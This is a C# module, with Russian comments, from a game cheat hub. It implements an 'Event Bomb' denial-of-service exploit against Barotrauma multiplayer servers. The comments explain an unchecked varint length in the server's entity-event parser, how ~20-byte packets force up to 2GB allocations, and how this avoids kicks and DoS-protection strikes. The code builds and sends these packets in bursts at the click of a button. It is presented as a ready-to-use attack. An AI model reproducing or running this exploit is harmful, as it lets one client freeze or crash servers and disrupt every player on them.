// ============================================================================
//  EventBombModule.cs — «СОБЫТИЙНАЯ БОМБА» (волна 715)
//  NEW CVE-CLASS: unbounded array allocation from raw varint in the ENTITY
//  EVENT ENVELOPE — the most normal client→server path in the game.
//
//  БАГ (ServerEntityEventManager.cs:475 Read + Message.cs:427 MsgReader.ReadBytes):
//    int msgLength = (int)msg.ReadVariableUInt32();     // СЫРОЙ varint из пакета
//    ...
//    byte[] temp = msg.ReadBytes(msgLength - 2);
//    → MsgReader.ReadBytes: byte[] retval = new byte[numberOfBytes];  // АЛЛОКАЦИЯ ДО ВСЯКИХ ПРОВЕРОК
//    → NetBitWriter.ReadBytes: byte-aligned → Buffer.BlockCopy → ArgumentException
//      (источник ~100 байт, копируем 200MB) — кидается ПОСЛЕ аллокации.
//
//  Счётчик НЕ клампится: 5-байтовый varint = до 2GB одним событием.
//  Универсальный ReadArray (INetSerializableStruct) клампит через
//  ReadInteger(0, ArrayMaxSize) — этот путь его НЕ использует.
//
//  ПОЧЕМУ ЭТО ЛУЧШЕ ПЕРКОВОЙ БОМБЫ (713):
//    - НЕТ ПЕРМ-ГЕЙТА ВООБЩЕ. Энтити-события шлёт каждый живой клиент
//      каждый тик. Единственные условия: ты в раунде + валидный entityID.
//    - НЕ КИКАЕТ: ArgumentException/OOM ≠ NetStructReadException → ветка
//      "kick malformed" в пирах не срабатывает, ловит catch-all Update.
//    - НЕТ СТРАЙКОВ: new byte[N] с занулением 200MB ≈ 10-20мс (memset) —
//      ниже 100мс порога DoSProtection. BlockCopy кидает мгновенно.
//    - Пакет ~20 байт. Рейт-лимит 4000/мин (66/с) — наши 20/с даже не потеют.
//
//  ЭКОНОМИКА: 1 клик CHURN = 20 пакетов × ~200MB = ~4GB свежих занулённых
//  LOH-аллокаций ЗА СЕКУНДУ на сервере → GC-шторм → фризы у всех игроков.
//  SHOT = 2GB новым массивом за раз (на слабом хосте — мгновенный OOM,
//  на жирном — 2GB пика + 100-200мс фриза, 1 strike из 6).
//
//  ФОРМАТ ПАКЕТА (повторяем SegmentTableWriter + NetEntityEventManager.Write):
//    byte  1 (UPDATE_INGAME)
//    bool  false (midroundSyncingDone) + pad
//    int32 tablePointerPlaceholder
//    [payload] pad | u16 firstEventID | byte eventCount=1
//              | u16 entityID (мой персонаж)
//              | varuint32 msgLength (БОМБА)
//              | u16 characterStateID=0
//    [table] u16 segmentCount=1 + Segment<ClientNetSegment>{EntityState, ptr}
//            (собирается рефлексией: public record struct, ctor(T,int) + Write())
//
//  firstEventID = GameMain.Client.LastSentEntityEventID + 1 (public поле,
//  сервер сам его присылает) → выравнивание ID гарантировано → событие
//  ОБРАБОТАНО, не скипнуто. characterStateID=0 → не задержится в буфере
//  (но ему и не нужно: аллокация происходит на ПАРСЕ, до BufferEvent).
//
//  БОНУС-БАГ (не эксплойт): skip-путь делает msg.BitPosition += msgLength*8 —
//  int overflow при msgLength ≥ 2^29 → BitPosition уезжает НАЗАД → ре-парсинг
//  своих же байтов в следующей итерации цикла.
//
//  Работает на ОБОИХ транспортах, из раунда (в лобби нет entity).
// ============================================================================

using System;
using System.Collections.Generic;
using Barotrauma;
using Barotrauma.Networking;
using Microsoft.Xna.Framework;

namespace CSHUB.Modules
{
    public class EventBombModule : CSModuleBase
    {
        public override string Id   => "event_bomb";
        public override string Name => "Event Bomb";
        public override string Description =>
            "Entity-event envelope reads a RAW varint length and does new byte[length-2] with NO clamp " +
            "(ServerEntityEventManager.Read -> MsgReader.ReadBytes). NO permission gate at all — every " +
            "in-round client can send it. ~20 byte packet = up to 2GB server allocation. Not kicked " +
            "(ArgumentException, not NetStructReadException), no DoS strikes (memset < 100ms).";
        public override string Category => "exploit";

        public override string GetLabel() => "Event Bomb 🎆";

        public override void OnClick()
        {
            var box = new GUIMessageBox(
                "EVENT BOMB (entity-event alloc)",
                "ServerEntityEventManager.Read:\n" +
                "  msgLength = raw varint (5 bytes on wire)\n" +
                "  temp = new byte[msgLength - 2]   // NO CLAMP\n" +
                "  BlockCopy throws AFTER the allocation -> memory taken,\n" +
                "  exception swallowed, NO kick, NO DoS strike (memset<100ms).\n" +
                "\n" +
                "No permission gate — normal client path, both transports.\n" +
                "Needs: in round (valid entity ID).\n" +
                "\n" +
                "CHURN x20 = ~4GB/s LOH allocation storm on the server.\n" +
                "SHOT x5 = 2GB array demand per packet.",
                new LocalizedString[]
                {
                    "CHURN x20 (~4GB/s)",
                    "SHOT x5 (2GB each)",
                    "Close",
                },
                new Vector2(0.62f, 0.7f));

            box.Buttons[0].Color = Color.Orange;
            box.Buttons[1].Color = Color.Red;
            box.Buttons[2].Color = Color.DarkGray;

            box.Buttons[0].OnClicked = (_, _) =>
            {
                int ok = EventBombEngine.FireBurst(20, 0x0C800000); // ~201MB
                GUI.AddMessage($"[EventBomb] CHURN: {ok}/20 бомб по ~201MB отправлено = ~{ok * 201}MB " +
                    "занулено на сервере за секунду. Жми ещё для GC-шторма.", Color.Orange);
                return true;
            };

            box.Buttons[1].OnClicked = (_, _) =>
            {
                int ok = EventBombEngine.FireBurst(5, 0x7FFFF000); // ~2GB
                GUI.AddMessage($"[EventBomb] SHOT: {ok}/5 бомб по ~2GB отправлено. " +
                    "На слабом хосте это OOM-кандидат, на жирном — пики по 2GB.", Color.Red);
                return true;
            };

            box.Buttons[2].OnClicked = (_, _) => { box.Close(); return true; };
        }
    }

    internal static class EventBombEngine
    {
        private static Type _tClientNetSegment, _tSegment;
        private static System.Reflection.ConstructorInfo _ciSegment;
        private static System.Reflection.MethodInfo _miWrite;

        private static bool EnsureReflection(out string error)
        {
            if (_miWrite != null) { error = ""; return true; }

            var asm = typeof(GameMain).Assembly;
            _tClientNetSegment = asm.GetType("Barotrauma.Networking.ClientNetSegment", false);
            if (_tClientNetSegment == null) { error = "reflection: ClientNetSegment not found"; return false; }

            var open = asm.GetType("Barotrauma.Networking.Segment`1", false);
            if (open == null) { error = "reflection: Segment`1 not found"; return false; }
            _tSegment = open.MakeGenericType(_tClientNetSegment);

            _ciSegment = _tSegment.GetConstructor(new[] { _tClientNetSegment, typeof(int) });
            if (_ciSegment == null) { error = "reflection: Segment ctor not found"; return false; }

            _miWrite = typeof(INetSerializableStruct).GetMethod("Write");
            if (_miWrite == null) { error = "reflection: INetSerializableStruct.Write not found"; return false; }

            error = "";
            return true;
        }

        /// <summary>Отправляет count бомб с аллокацией allocBytes. Возвращает сколько ушло.</summary>
        public static int FireBurst(int count, int allocBytes)
        {
            if (GameMain.Client?.ClientPeer == null) { return 0; }
            if (GameMain.Client.Character == null)
            {
                GUI.AddMessage("[EventBomb] нужен раунд (нет персонажа = нет валидного entityID)", Color.Red);
                return 0;
            }
            if (!EnsureReflection(out string err))
            {
                GUI.AddMessage("[EventBomb] " + err, Color.Red);
                return 0;
            }

            ushort myEntityId = GameMain.Client.Character.ID;
            // сервер ждёт событие с ID = LastSentEntityEventID + 1 (поле присылает сам сервер).
            // ВАЖНО: обработка бомбы кидает исключение ДО sender.LastSentEntityEventID++,
            // поэтому счётчик сервера НЕ двигается — ВЕСЬ burst шлёт ОДИН И ТОТ ЖЕ ID
            // (иначе 2-й и дальше уйдут в skip-путь без аллокации).
            ushort eventId = (ushort)(GameMain.Client.LastSentEntityEventID + 1);

            int sent = 0;
            for (int i = 0; i < count; i++)
            {
                try
                {
                    if (SendOne(myEntityId, eventId, allocBytes)) { sent++; }
                    else { break; }
                }
                catch (Exception e)
                {
                    GUI.AddMessage("[EventBomb] send fail: " + e.Message, Color.Red);
                    break;
                }
            }
            return sent;
        }

        private static bool SendOne(ushort entityId, ushort eventId, int allocBytes)
        {
            var msg = new WriteOnlyMessage();

            msg.WriteByte((byte)ClientPacketHeader.UPDATE_INGAME);
            msg.WriteBoolean(false);   // midroundSyncingDone
            msg.WritePadBits();

            // --- segment table (ручной SegmentTableWriter) ---
            int pointerLocation = msg.BitPosition;
            msg.WriteInt32(0);         // placeholder под table pointer

            int segmentStart = msg.BitPosition;

            // --- EntityState payload (формат NetEntityEventManager.Write) ---
            msg.WritePadBits();
            msg.WriteUInt16(eventId);
            msg.WriteByte(1);          // eventCount = 1

            msg.WriteUInt16(entityId);
            msg.WriteVariableUInt32((uint)allocBytes); // ← БОМБА: сервер сделает new byte[allocBytes-2]
            msg.WriteUInt16(0);        // characterStateID = 0 (не задержится в буфере)
            // дальше данных НЕТ: сервер читает из-за края буфера (нули) — BlockCopy кинет после аллокации

            int tablePosition = msg.BitPosition;

            // патчим table pointer
            msg.BitPosition = pointerLocation;
            msg.WriteInt32(tablePosition - pointerLocation);
            msg.BitPosition = tablePosition;

            // таблица: u16 count + Segment<ClientNetSegment>(EntityState, pointer)
            msg.WriteUInt16(1);
            object segment = _ciSegment.Invoke(new[]
            {
                Enum.Parse(_tClientNetSegment, "EntityState"),
                (object)(segmentStart - pointerLocation)
            });
            _miWrite.Invoke(segment, new object[] { msg });

            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return true;
        }
    }
}
